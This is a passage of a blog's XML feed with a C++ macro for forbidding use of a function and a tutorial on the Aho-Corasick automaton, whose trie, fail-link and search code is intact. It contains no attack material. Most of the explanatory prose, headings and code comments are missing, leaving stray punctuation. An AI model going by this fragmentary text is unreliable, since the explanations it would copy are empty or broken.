fd</span><br><span class="line">0340   19 64 90 e5 b5 31 a5 e8 d8 7c 84 e6 41 87 81 ..</span><br></pre></td></tr></table></figure><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0340   .. .. .. .. .. .. .. .. .. .. .. .. .. .. .. 03</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Protocol </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ </title>
      <link href="/2022/03/09/C++%E4%B8%80%E7%A7%8D%E7%A6%81%E6%AD%A2%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E8%A2%AB%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AE%8F/"/>
      <url>/2022/03/09/C++%E4%B8%80%E7%A7%8D%E7%A6%81%E6%AD%A2%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E8%A2%AB%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AE%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_VER)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ShouldNotUse(msg) <span class="keyword">_Pragma</span>(<span class="string">&quot;warning(error:4996)&quot;</span>) [[deprecated(msg)]] <span class="keyword">_Pragma</span>(<span class="string">&quot;warning(warning:4996)&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__GNUC__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ShouldNotUse(msg) [[deprecated(msg)]] __attribute__((<span class="keyword">error</span>(msg)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ShouldNotUse(msg)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>macro</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ShouldNotUse</span>(<span class="string">&quot;denied&quot;</span>) <span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>, <br><a href="https://onlinegdb.com/cFYNQv9nF">playground</a></p><p>(, <code>=delete</code>)</p>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aho-corasick automaton AC</title>
      <link href="/2022/01/11/aho-corasick-automaton-(AC%E8%87%AA%E5%8A%A8%E6%9C%BA)%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2022/01/11/aho-corasick-automaton-(AC%E8%87%AA%E5%8A%A8%E6%9C%BA)%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>, 3.3<br><a href="https://oi-wiki.org/string/ac-automaton">oi-wiki</a></p></blockquote><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p>:</p><ul><li>Trie <a href="https://yuepenglei.github.io/2019/01/06/Trie/"></a></li><li>BFS Trie</li><li>(x<br>int&#x2F;longboolbool, <ul><li><code>(n&gt;&gt;k)&amp;1</code>nk</li><li><code>n^(1&lt;&lt;k)</code> nk</li></ul></li><li>AC()</li></ul><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><p>, triebfs(DFA)</p><h2 id="3-"><a href="#3-" class="headerlink" title="3. "></a>3. </h2><h3 id="3-1-Trie"><a href="#3-1-Trie" class="headerlink" title="3.1 Trie"></a>3.1 Trie</h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">Node* next[<span class="number">26</span>];</span><br><span class="line"><span class="type">bool</span> end;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>(anscii,  <code>char - &#39;a&#39;</code>)<br>, <br><strong></strong>(<code>nodes[x][y]</code>x,y<code>y+&#39;a&#39;</code> 0&lt;&#x3D;y&lt;&#x3D;25, a<code>&#39;a&#39;-&#39;a&#39;=0</code>), <a href="https://oi-wiki.org/string/ac-automaton/#_5">oi-wiki</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> s = <span class="number">50</span>; </span><br><span class="line"><span class="type">int</span> nodes[s][<span class="number">26</span>]&#123;<span class="number">0</span>&#125;;  </span><br><span class="line"><span class="type">int</span> now = <span class="number">1</span>;</span><br><span class="line"><span class="type">bool</span> end[s];</span><br></pre></td></tr></table></figure><ul><li><code>s</code><code>#define</code></li><li><code>end</code>()</li><li><code>now</code></li></ul><p><code>add()</code><code>insert</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// , </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// </span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// </span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    end[p] = <span class="literal">true</span>; <span class="comment">// </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-1-1-endNodes"><a href="#3-1-1-endNodes" class="headerlink" title="3.1.1 endNodes"></a>3.1.1 endNodes</h4><p>, endboolint32_t, 32(01)<br>, 2(8, 16, 32)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> s = <span class="number">50</span>; </span><br><span class="line"><span class="type">int</span> nodes[s][<span class="number">26</span>]&#123;<span class="number">0</span>&#125;;  </span><br><span class="line"><span class="type">int</span> now = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> bitW = <span class="number">32</span>;                             <span class="comment">// 2n</span></span><br><span class="line"><span class="type">int32_t</span> endNodes[s / bitW + (s % bitW &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)]&#123;<span class="number">0</span>&#125;; <span class="comment">// </span></span><br></pre></td></tr></table></figure><p>, add</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// , </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// </span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// </span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    endNodes[p / bitW] = endNodes[p / bitW] ^ (<span class="number">1</span> &lt;&lt; (p &amp; (bitW - <span class="number">1</span>))); <span class="comment">// , endNodes[p/bitW]^(1&lt;&lt;n)n, p&amp;63:2^n,p&amp;(k-1),p&amp;63</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>p():</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) </span><br></pre></td></tr></table></figure><h3 id="3-2-"><a href="#3-2-" class="headerlink" title="3.2 "></a>3.2 </h3><p>fail(1, -1, 0), <br>(queue)BFS<br><br>:<br> -&gt; bfs()-&gt;-&gt;(!&#x3D;0, ), 3:</p><ul><li>0, 0</li><li>, </li><li>, </li></ul><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fail[s]&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieFail</span><span class="params">()</span> </span>&#123;                                   <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> n;                                          <span class="comment">// now, </span></span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; ns;                                  <span class="comment">// </span></span><br><span class="line">    ns.<span class="built_in">push</span>(<span class="number">0</span>);                                     <span class="comment">// </span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ns.<span class="built_in">empty</span>()) <span class="keyword">break</span>; <span class="comment">// </span></span><br><span class="line">        n = ns.<span class="built_in">front</span>();          <span class="comment">// </span></span><br><span class="line">        ns.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123; <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span> (nodes[n][i] != <span class="number">0</span>) &#123;</span><br><span class="line">                &#123;                         <span class="comment">// </span></span><br><span class="line">                    <span class="type">int</span> pp = n;           <span class="comment">// , , </span></span><br><span class="line">                    <span class="type">int</span> nn = nodes[n][i]; <span class="comment">// , </span></span><br><span class="line">                    <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123;        <span class="comment">// , </span></span><br><span class="line">                        fail[nn] = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span></span><br><span class="line">                        <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// , </span></span><br><span class="line">                            <span class="keyword">if</span> (fail[pp] != <span class="number">0</span>) pp = fail[pp] - <span class="number">1</span>; <span class="comment">// , </span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">throw</span> <span class="built_in">invalid_argument</span>(<span class="built_in">to_string</span>(nn) + <span class="string">&quot;-&quot;</span> + <span class="built_in">to_string</span>(pp) + <span class="string">&quot;x&quot;</span>); <span class="comment">// unreachable</span></span><br><span class="line">                            <span class="keyword">if</span> (nodes[pp][i] != <span class="number">0</span>) &#123;                                               <span class="comment">// ()i, </span></span><br><span class="line">                                fail[nn] = nodes[pp][i] + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123; <span class="comment">// , </span></span><br><span class="line">                                fail[nn] = <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ns.<span class="built_in">push</span>(nodes[n][i]); <span class="comment">// </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-"><a href="#3-3-" class="headerlink" title="3.3 "></a>3.3 </h3><p>, </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;string&gt; <span class="title">trieFind</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123; <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                                     <span class="comment">// </span></span><br><span class="line">    vector&lt;string&gt; rev;                            <span class="comment">// </span></span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123; <span class="comment">// </span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>) re = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] != <span class="number">0</span>) &#123; <span class="comment">// ,</span></span><br><span class="line">                p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                re += each;</span><br><span class="line">                <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// ,p&amp;63=p%bitW,(endNodes[p/bitW]&gt;&gt;n)&amp;1n</span></span><br><span class="line">                    rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">                    p = fail[p] - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                        re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fail[p] == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">                p = fail[p] - <span class="number">1</span>; <span class="comment">// (fail1)</span></span><br><span class="line">                <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                    re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// </span></span><br><span class="line">        rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-"><a href="#3-4-" class="headerlink" title="3.4 "></a>3.4 </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">printVector</span><span class="params">(vector&lt;string&gt; t)</span> </span>&#123;</span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i: t)</span><br><span class="line">        re += i + <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;gsafsfawdasca&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;gdscascwadawxszg&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;ewyuoascasdwo&quot;</span>);</span><br><span class="line">    <span class="built_in">trieAdd</span>(<span class="string">&quot;csaxawewddwaqw&quot;</span>);</span><br><span class="line">    <span class="built_in">trieFail</span>();</span><br><span class="line">    cout &lt;&lt; <span class="built_in">to_string</span>(now) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;csaxawewddwaqwfsacasfegdscascwadawxszgagsafsfawdascawgrhherasdawdwzz&quot;</span>)) &lt;&lt; endl</span><br><span class="line">         &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;fsacasfegdscascwadawxszgsafsfawdascawgrhherasdawdwzzcsaxawewddwaqw&quot;</span>)) &lt;&lt; endl</span><br><span class="line">         &lt;&lt; <span class="built_in">printVector</span>(<span class="built_in">trieFind</span>(<span class="string">&quot;cegergecsaxaweqsdawryyrgte&quot;</span>)) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s; i++)</span><br><span class="line">        cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> a: fail)</span><br><span class="line">        cout &lt;&lt; a - <span class="number">1</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-"><a href="#3-5-" class="headerlink" title="3.5 "></a>3.5 </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) Eritque arcus</span></span><br><span class="line"><span class="comment"> * Date: 2022/1/11</span></span><br><span class="line"><span class="comment"> * MIT license</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> s = <span class="number">50</span>;                                  <span class="comment">// </span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">int</span> bitW = <span class="number">32</span>;                                <span class="comment">// 2n</span></span><br><span class="line"><span class="type">int</span> nodes[s][<span class="number">26</span>]&#123;<span class="number">0</span>&#125;;                                    <span class="comment">// </span></span><br><span class="line"><span class="type">int</span> fail[s]&#123;<span class="number">0</span>&#125;;                                         <span class="comment">// </span></span><br><span class="line"><span class="type">int</span> now = <span class="number">1</span>;                                            <span class="comment">// </span></span><br><span class="line"><span class="type">int32_t</span> endNodes[s / bitW + (s % bitW &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)]&#123;<span class="number">0</span>&#125;; <span class="comment">// </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieFail</span><span class="params">()</span> </span>&#123;                                       <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> n;                                              <span class="comment">// now, parent</span></span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; ns;                                      <span class="comment">// </span></span><br><span class="line">    ns.<span class="built_in">push</span>(<span class="number">0</span>);                                         <span class="comment">// </span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ns.<span class="built_in">empty</span>()) <span class="keyword">break</span>; <span class="comment">// </span></span><br><span class="line">        n = ns.<span class="built_in">front</span>();        <span class="comment">// </span></span><br><span class="line">        ns.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123; <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span> (nodes[n][i] != <span class="number">0</span>) &#123;</span><br><span class="line">                &#123;                         <span class="comment">// </span></span><br><span class="line">                    <span class="type">int</span> pp = n;           <span class="comment">// , , </span></span><br><span class="line">                    <span class="type">int</span> nn = nodes[n][i]; <span class="comment">// , </span></span><br><span class="line">                    <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123;        <span class="comment">// , </span></span><br><span class="line">                        fail[nn] = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span></span><br><span class="line">                        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;                            <span class="comment">// , </span></span><br><span class="line">                            <span class="keyword">if</span> (fail[pp] != <span class="number">0</span>) pp = fail[pp] - <span class="number">1</span>; <span class="comment">// , </span></span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">throw</span> <span class="built_in">invalid_argument</span>(<span class="built_in">to_string</span>(nn) + <span class="string">&quot;-&quot;</span> + <span class="built_in">to_string</span>(pp) + <span class="string">&quot;x&quot;</span>); <span class="comment">// unreachable</span></span><br><span class="line">                            <span class="keyword">if</span> (nodes[pp][i] != <span class="number">0</span>) &#123;                                               <span class="comment">// ()i</span></span><br><span class="line">                                fail[nn] = nodes[pp][i] + <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (pp == <span class="number">0</span>) &#123; <span class="comment">// , </span></span><br><span class="line">                                fail[nn] = <span class="number">1</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ns.<span class="built_in">push</span>(nodes[n][i]); <span class="comment">// </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trieAdd</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123;   <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                            <span class="comment">// , </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123;               <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] == <span class="number">0</span>)    <span class="comment">// </span></span><br><span class="line">            nodes[p][each - <span class="string">&#x27;a&#x27;</span>] = now++; <span class="comment">// </span></span><br><span class="line">        p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];         <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line">    endNodes[p / bitW] = endNodes[p / bitW] ^ (<span class="number">1</span> &lt;&lt; (p &amp; (bitW - <span class="number">1</span>))); <span class="comment">// , endNodes[p/bitW]^(1&lt;&lt;n)n, p&amp;63:2^n,p&amp;(k-1),p&amp;63</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">trieFind</span><span class="params">(<span class="type">const</span> std::string &amp;text)</span> </span>&#123; <span class="comment">// </span></span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;                                     <span class="comment">// </span></span><br><span class="line">    vector&lt;string&gt; rev;                            <span class="comment">// </span></span><br><span class="line">    string re;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> each: text) &#123; <span class="comment">// </span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>) re = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (nodes[p][each - <span class="string">&#x27;a&#x27;</span>] != <span class="number">0</span>) &#123; <span class="comment">// ,</span></span><br><span class="line">                p = nodes[p][each - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                re += each;</span><br><span class="line">                <span class="keyword">if</span> ((endNodes[p / bitW] &gt;&gt; (p &amp; (bitW - <span class="number">1</span>))) &amp; <span class="number">1</span>) &#123; <span class="comment">// ,p&amp;63=p%bitW,(endNodes[p/bitW]&gt;&gt;n)&amp;1n</span></span><br><span class="line">                    rev.<span class="built_in">push_back</span>(re);</span><br><span class="line">                    p = fail[p] - <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(re.<span class="built_in">length</span>() &gt; <span class="number">1</span>)</span><br><span class="line">                        re = re.<span class="built_in">substr</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                